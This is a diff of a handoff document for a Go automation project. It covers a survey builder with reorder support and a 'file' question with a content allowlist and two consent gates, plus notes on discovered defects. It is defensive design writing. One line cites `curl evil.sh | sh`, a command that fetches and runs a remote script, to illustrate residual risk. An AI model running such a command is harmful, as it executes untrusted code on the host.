@@ -4,157 +4,124 @@ Rewrite the "Current Status" section when stopping mid-task or handing off, per 
 
 ## Current Status (this session)
 
-**Branch `feature/section-row-actions`, 31 commits, off `main` at `227fc9e`, NOT pushed.**
-`feature/job-cancel` is rebased underneath it, so the two are one linear history and that branch
-is independently correct at `749c117`.
+**Branch `feature/survey-builder`, 3 commits, stacked on `feature/section-row-actions`
+(pushed, `17e240c`), which is stacked on `feature/job-cancel`, off `main` at `227fc9e`.
+NOT pushed.**
 
-The session set out to continue the work list and did. The larger result is that **item I was
-shipping a total outage, and five consecutive gate runs called it flake.** Read that first.
+Item C is done, and it grew a second half the list did not have: **a `file` survey question**,
+asked for directly, with the executable-content policy that has to come with it.
 
-### The outage
+### Item C: the survey builder
 
-Every job on `feature/job-cancel` hung in `running` forever, in every deployment rather than only
-in tests. The Controller stamps a dispatch with the JetStream message id `"<jobID>:<deviceID>"`;
-the Runner published that device's result under the byte-identical id. JetStream's duplicate
-window is scoped to the STREAM, not the subject, and `internal/topology` puts every subject in one
-stream, so every result collapsed onto the dispatch that had caused it.
+The survey was the largest read-only object in the product. Its model has been complete since
+the Templates view was built and the only way to author one was the JSON API or the database.
+It is now authored from its own section: add in the header, then edit, remove and move on each
+row, all four naming one narrowed endpoint (`PUT /templates/{id}/survey`, `set-survey`).
 
-It was silent in three independent ways. A suppressed duplicate returns `PubAck{Duplicate: true}`
-with a NIL error; `internal/event` discarded that ack, so a dropped publish and a delivered one
-were the same value everywhere above it; and the WAL then acknowledged the entry, destroying the
-only retry. The selection it produced is why it read as flake: the window is `min(budget, 5m)`, so
-FAST jobs hung and jobs slower than five minutes completed.
+**Reorder is what needed the one new thing.** `RowAction.Applies` took only the `Row`, which
+cannot answer "is this the first one": a Row's Cells are display strings and its ID is author
+data, so reading an ordinal out of either is parsing a label. It now takes a `RowPosition`
+(`Index`, `Count`, `First()`, `Last()`), so Move up is withheld on the first row and Move down
+on the last. Nothing implemented the old signature, so the widening cost two test call sites.
+This is the addition the previous handoff said reorder would need, and it is the shape it said
+it would be.
 
-**The gate hole is the more transferable finding.** `tests/e2e` was waived per PACKAGE while its
-waiver's own prose named exactly one test. Four tests failed on this in five consecutive
-push-gate runs and every run printed `testgate: passed (warnings above)`. The previous session's
-handoff recorded, truthfully and misleadingly, that both test phases passed. FAILURE_PATTERNS #222
-and #224, LESSONS_LEARNED #185 and #186.
+Two doc comments had gone stale and were corrected in the same change rather than left:
+`RowAction`'s still said a row control never prompts (item B made that false), and the
+templates writer gave "the shared form machinery has no control for it" as the reason the
+survey is carried forward.
 
-### What was fixed, and what each one cost to find
+### The `file` question, and the part worth reading
 
-1. **The message-id collision** (`b119578`). One line, plus the log line that would have made it
-   visible on day one, plus the real-broker test whose absence let it ship: both existing dedup
-   tests published to a SINGLE topic, so both were equally consistent with per-subject and
-   per-stream dedup, and they passed beside three comments asserting the wrong model.
-2. **A second permanent hang** (`bbeb891`), masked by the first. A job whose devices all reported
-   before its fan-out finished was parked in `running` with nothing left to end it.
-3. **The flake gate** (`749c117`). An entry may now name its tests and then tolerates only those.
-4. **The e2e harness** (`65b2d55`). It decoded every poll into one reused value, so an `omitempty`
-   field plus an unordered array put one device's skip reason on another device's row; three
-   investigations blamed the fan-out. It also asserted nothing the Runner reported, which is the
-   capability this branch exists to add.
-5. **A task list that reshuffled between identical reads** (`b697279`).
-6. Item B's own three, recorded as FAILURE_PATTERNS #219, #220 and #221.
+A survey can now ask for a file. The answer is the file's own text carried as an ordinary extra
+variable, so every existing consumer reads it unchanged. It is bounded at 32 KiB (chosen
+against `decodeJSON`'s existing 64 KiB body cap, not for roundness), treated as secret, and
+proved to be text.
 
-### The list this is working through
+**The content rule is an allowlist, and that is the whole design.** The first sketch was a table
+of magic numbers plus a `#!` test. A design panel killed it: a denylist fails OPEN on every
+shape nobody listed, and the named bypasses (a BOM before the shebang, UTF-16, a zip, a
+polyglot) all live in that gap. What shipped is "valid UTF-8, no NUL anywhere, no byte-order
+mark, `#!` at offset zero exactly". An ELF is refused because it carries NUL, not because
+anybody listed ELF. LESSONS_LEARNED #190.
+
+**Two gates, and the deployment's half is a live kill switch.** A file opening with an
+interpreter line needs both `PLEIADES_SURVEY_FILE_ALLOW_PROGRAM_CONTENT` on the Controller and
+`allow_program_content` on the question. The deployment's half is read at startup, threaded as a
+value, and consulted at every launch rather than at authoring time, so clearing it and
+restarting stops templates that already carry the flag. The dispatcher ASSIGNS it onto
+`launch.Config` immediately before resolving, overwriting whatever the caller put there, because
+a defaulting version lets anybody who can build a Config grant themselves the deployment's
+consent. Both properties have their own test; the assignment was proved by a negative control.
+LESSONS_LEARNED #191.
+
+**The residual risk is in the code, not only here.** This refuses a file that ANNOUNCES itself
+as a program and cannot refuse one that IS one. A text file holding `curl evil.sh | sh` passes
+every test and is accepted with both gates shut. The danger lives in what the automation does
+with an answer, and a runbook may already pipe any `text` answer to a shell with no flag at all.
+The flag is named `AllowProgramContent` rather than `AllowExecutableFiles` for exactly that
+reason. What the gates buy is separation of duty. The untaken fix is a gate on what a runbook
+may DO with an answer, which is much larger work.
+
+**The launch control is a textarea, not a file picker.** Every write in this UI is parsed with
+`r.ParseForm`, which does not read a multipart body at all, so an `<input type="file">` would
+post the filename and silently blank every other control on the form. The picker is its own
+piece of work on the form pipeline (see below). What reaches the automation is identical.
+
+### Three pre-existing defects found, all verified, none fixed
+
+Each was found by a parallel sweep and then confirmed directly with `go_symbol_references` or by
+reading the code, because two of them were first reported by an agent and agents are wrong
+sometimes. They are **not** introduced by this branch.
+
+1. **`jobs.extra_vars` is plaintext.** `cmd/controller` registers crypto hooks for `Device`,
+   `SavedLaunchConfig`, `Credential` and `MeshSigningKey` only. A secret survey answer is
+   encrypted in `saved_launch_configs.answers` and in the clear in `jobs.extra_vars`, in the
+   same database. The file question makes the values flowing through it larger and more likely
+   to be key material.
+2. **A survey answer never reaches the log masker.** `wire.Injected.Mask` is built from
+   credential artifacts only, so a task that echoes a password or file answer lands it in the
+   job log unredacted. `internal/credtype/inputs.go` claimed otherwise and has been corrected.
+   Deliberately not closed by adding survey answers to `redact.Literals`: a 32 KiB literal in
+   the process-wide set would scrub enormous unrelated substrings out of every later log line.
+3. **A chunked launch silently discards its body.** `internal/api/dispatcher.go` decodes only
+   `if r.ContentLength > 0`; a chunked POST has `-1`, so every answer and override is dropped
+   and the launch returns 202 having run the template's defaults. Two sibling handlers share the
+   shape, where an empty body is legitimate. The launch one is not. One line to fix.
+
+A fourth, recorded as FAILURE_PATTERNS #228: `routing.CheckInjectable` has one production
+caller, and the UI's own credential-binding action writes straight to the store, so an env/file
+binding made through `/ui` is caught only by the run-time backstop.
+
+### The list
 
 | Item | What it is | First sized | State |
 |---|---|---|---|
-| B | Section write path, row half | S | **DONE.** Both halves. Add, edit in place and remove on a credential type's inputs. |
-| C | Survey builder | S add / M edit | **NEXT.** Model is complete and persisted, UI is read-only. The seam its edit half waited on now exists; only reorder needs anything new. |
+| B | Section write path, row half | S | **DONE.** Add, edit in place and remove on a credential type's inputs. |
+| C | Survey builder | S add / M edit | **DONE**, plus the `file` question type and its two gates. |
 | E | Tasks tab and Download | M | `internal/journal` is real and no API endpoint exposes it. Download has no route shape to reuse. |
 | F | Users: password reset, team display | M | `internal/apispec` declares no password endpoint of any kind. No team-member port. |
 | G | Inventory Sources | M | New entity plus both dialects' migrations. D's runner and history pattern is reusable. |
 | H | Execution envs, instance groups, max hosts | L | Both UI resources exist at `view.StatusDeclared`. The heartbeat is a file, not a registration. |
 
-### Item B: DONE, both halves
-
-`view.RowAction`, declared on a Section and addressed at `/{resource}/{id}/{action}/{row}`. A row
-control can act at once (Remove) or prompt (Edit), and the credential type is the consumer that
-proves it: an input can be added, edited in place and removed, where both tabs were one-way doors
-whose only route back was the JSON API or the database.
-
-**Prompting and prefilling are ONE decision, enforced at registration** rather than tested for. A
-row action declaring `Fields` must declare `Form`. A prompt with no prefill renders the row's
-current values as empty boxes and blanks whichever the operator does not retype, which is the
-exact failure the seam exists to remove, so the combination is refused outright.
-
-**A row prompt is an edit form and a record prompt is not, with no new mode flag.** `ActionModel`
-carries the row, and a form has a row exactly when it edits something that already exists.
-`Immutable` then means what it means everywhere else, so ONE field slice serves the add form and
-the edit form: the control naming the row is offered by the first and withheld by the second.
-
-**The seam found two live bugs before it had a consumer**, FAILURE_PATTERNS #226 and #227, and
-the first is the one to read. `bindCredentialsAction` resolved a template's bound credentials,
-sorted them, and dropped them, because there was nowhere to put a form value. The multi-select
-rendered with nothing selected on a template bound to three credentials, and pressing the button
-as drawn replaced those three with none: the template silently stopped authenticating as
-anything. A variable built with care and never read is a question, not dead code.
-
-**Item C's edit half no longer waits on anything.** A survey question's edit and its delete land
-directly on this. Reorder needs one addition: `RowAction.Applies` sees only the Row, and "Move up"
-on the first row is a control that can only fail, so it needs the row's position. That was
-deliberately not added speculatively, because the shape of reorder is not yet known.
-
-### Where the gate stands
-
-`make ci` was run to completion. `build`, `vet`, `fmt`, `tidy-check`, `test-race`, `test-repeat`,
-`test-integration`, `gosec` and `govulncheck` all pass, and `tests/e2e` is clean. `docs-lint`,
-`docs-gen-check`, `helm-lint` and `templ-gen-check` were run separately and pass, because `make`
-stops at its first failure and would otherwise have left them unobserved.
-
-`coverage` did not pass, and the reason is environmental rather than a coverage question:
-`coverage-check` runs its own fourth full parallel `go test ./...` and bails before measuring
-anything if that pass has a failure. It was run three times. Each time it failed, and each time
-it failed on a DIFFERENT set of packages with no overlap between them:
-
-| run | packages that failed |
-|---|---|
-| inside `make ci` | `cmd/runner`, `internal/lock`, `internal/topology` (two) |
-| standalone | `cmd/controller`, `internal/ent` (twelve, all one shared postgres container), `internal/meshid`, `internal/topology` (two) |
-| standalone, after the daemon had settled | `cmd/pleiades`, `cmd/runner` (two), `internal/topology` |
-
-"The specific package that loses the race changes between runs" is verbatim what
-`flaky-packages.json` cites as the signature of resource contention, and every failure is a
-container that would not come up: `connection refused` to an already-mapped port, or in the worst
-run a `context deadline exceeded` against the Docker SOCKET after 537 retries, which is the
-daemon itself saturating rather than any container. Samples from each run were rerun in
-isolation and pass, in 0.66s to 7.8s against 11s to 61s of retrying under load.
-
-**That comparison is the discriminator this session exists to teach**, and it is worth stating
-next to the thing it is being compared with. The e2e failures looked the same and were not: the
-same four tests, five runs out of five, failing identically at exactly the poll budget. Different
-packages each run is contention. The same packages every run is a defect.
-
-So the coverage ratchet has not been measured on this branch, and no floor has been checked.
-Nothing suggests a regression, and nothing has verified its absence either.
-
 ### Decisions left, not improvised
 
-1. **A `running` job has no watchdog.** A single lost result is still an unrecoverable hang with
-   no log line anywhere. `dispatch.Reaper` sweeps `fanning_out` only. The two known ways to lose
-   a result are fixed; the class is not closed.
-2. **A result can beat its own task row.** `worker_devices.go` publishes the dispatch before
-   writing the row, so a result arriving in between hits `RecordResult`'s not-found path, which
-   warns and ACKs, destroying the outcome permanently. Writing the row first would close it, but
-   `worker.go`'s cancel path already reasons from the current ordering, so it is a deliberate
-   decision rather than a swap.
-3. **Eighteen flaky-packages entries are still unnarrowed.** Narrowing each is real work against
-   real evidence, not a mechanical edit.
-4. **Two further gate rules were proposed and not taken.** Never tolerate a package-level kill
-   (a hang is not contention, though this repo has recorded a hang that genuinely was one), and
-   re-run a warned test in isolation and escalate if it fails again. The second is the rule that
-   would have caught this outage, and it changes the gate's wall-clock.
-5. Everything the parked job-cancel branch left open is still open, including the dead-letter
-   consumer and the dogfood pass. See the entry below this one in `HANDOFF_ARCHIVE.md`.
+1. **The file picker.** Real upload means the repo's first multipart parse. It is contained --
+   one branch in `runAction` on the request's content type, plus an `enctype` on forms that
+   declare a file field -- but its failure mode is silent and total: a form that gains `enctype`
+   while still being parsed by `ParseForm` returns EMPTY values for every field with no error.
+   That wants its own change with its own test, not a rider on this one.
+2. **A template can store an armed flag a deployment refuses.** `Survey.Validate` accepts
+   `allow_program_content` whatever the deployment says, so a template copied to a consenting
+   deployment keeps its author's intent. The authoring form withholds the checkbox where it
+   would do nothing and the Survey section's PROGRAM CONTENT column reads "refused here", but
+   the stricter reading of "don't offer choices that can only fail" would refuse the save. A
+   judgement call; the opposite call is defensible.
+3. **The three defects above.** Each is the user's to schedule. (3) is one line.
+4. Everything the previous entry left open is still open: the `running` watchdog, the
+   result-before-row ordering, the eighteen unnarrowed flaky entries, the two proposed gate
+   rules, the DLQ consumer and the dogfood pass. See `HANDOFF_ARCHIVE.md`.
 
 ### Next step
 
-Item C, the survey builder. Add, edit and delete a question all land on the seam that now exists;
-reorder needs `RowAction.Applies` to see the row's position.
-
-### One thing this machine cannot currently verify
-
-`make ci` was run three times today and its remaining red is the Docker daemon rather than the
-diff. The last run's only failure was `tests/e2e`: one postgres container failed to start against
-`/var/run/docker.sock` after 560 retries, and `goleak` then failed ELEVEN unrelated tests in the
-same package on the testcontainers reaper goroutine the failed setup left behind. Every one
-passes in isolation, and the cascade is the shape `flaky-packages.json`'s own
-`internal/transport/ssh` entry already describes.
-
-Two things follow. The goleak cascade is a diagnostic defect worth its own look: one provisioning
-failure produces eleven whose message, "found unexpected goroutines", names neither the container
-nor the cause. And the narrowed `tests/e2e` waiver correctly made these HARD rather than warning,
-which is the rule working as intended: a test nobody has seen flake before should stop the gate
-and make a human look. A human looked. It was the daemon.
+Item E, F, G or H. E is the smallest and `internal/journal` already holds the data.
